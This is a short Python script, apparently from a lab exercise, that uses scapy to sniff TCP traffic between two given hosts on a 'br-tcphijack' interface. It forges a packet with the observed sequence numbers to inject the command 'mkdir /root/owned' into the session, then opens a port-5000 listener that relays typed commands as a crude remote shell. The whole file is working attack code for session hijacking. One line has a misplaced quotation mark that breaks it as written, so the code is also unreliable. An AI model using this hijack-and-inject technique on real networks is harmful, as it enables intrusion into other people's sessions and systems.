import sys
from scapy.all import *
from nclib import TCPServer

def pkt_handler(pkt):
        if pkt[TCP].flags == "A":
                ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
                tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=pkt[TCP].flags)
                raw = Raw(load="mkdir /root/owned \r\n")
                send(ip/tcp/raw, iface="br-tcphijack", verbose=0)

                local_ip = get_if_addr("br-tcphijack)"
                local_port = 5000
                listener = TCPServer((local_ip, local_port))
                for address in listener:
                     print(address.recv())
                     address.send(input() + "\r\n")

if __name__ == "__main__":
        src_addr = str(sys.argv[1])
        dst_addr = str(sys.argv[2])

        filter = "tcp and src host {} and dst host {}".format(src_addr, dst_addr)
        pkt = sniff(iface="br-tcphijack", filter=filter, prn=pkt_handler)

